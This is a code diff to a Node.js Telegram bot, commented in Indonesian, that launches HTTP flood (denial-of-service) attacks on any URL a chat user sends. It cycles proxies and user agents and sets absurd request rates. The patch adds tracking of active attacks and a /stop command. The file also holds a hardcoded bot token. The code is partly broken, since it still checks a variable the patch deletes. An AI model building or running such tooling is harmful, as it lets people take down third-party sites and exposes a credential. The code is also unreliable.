@@ -8,6 +8,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const TELEGRAM_TOKEN = '7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0'; // Replace with your bot token
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
+const activeAttacks = new Map(); // Menyimpan serangan yang sedang aktif berdasarkan URL
 const proxyF = "proxy.txt";
 const uaLF = "ua.txt";
 const userAgents = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n").map(line => line.trim());
@@ -111,9 +112,31 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> untuk memulai serangan (contoh: /mulai https://example.com).");
 });
 
+bot.onText(/\/stop\s+(.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    let url = match[1].trim();
+
+    if (!url.startsWith("http://") && !url.startsWith("https://")) {
+        url = `https://${url}`;
+    }
+
+    if (activeAttacks.has(url)) {
+        activeAttacks.get(url).running = false;
+        activeAttacks.delete(url);
+        bot.sendMessage(chatId, `🛑 Serangan ke ${url} dihentikan.`);
+    } else {
+        bot.sendMessage(chatId, `⚠️ Tidak ada serangan aktif ke ${url}.`);
+    }
+});
+
 bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     let url = match[1].trim();
+
+    if (activeAttacks.has(url)) {
+        bot.sendMessage(chatId, "❗ Serangan ke URL ini sudah berjalan.");
+    return;
+    }
 
     // Tambahkan protokol jika tidak ada
     if (!url.startsWith("http://") && !url.startsWith("https://")) {
@@ -129,12 +152,15 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     }
 
     bot.sendMessage(chatId, "🚀 Memulai serangan... 🤣");
-    let continueAttack = true;
+    const attackController = { running: true };
+    activeAttacks.set(url, attackController);
     const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas realistis
     const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas kecepatan
 
     const attack = () => {
         try {
+            if (!attackController.running) return;
+
             if (!continueAttack) return;
 
             const userAgent = randElement(userAgents);
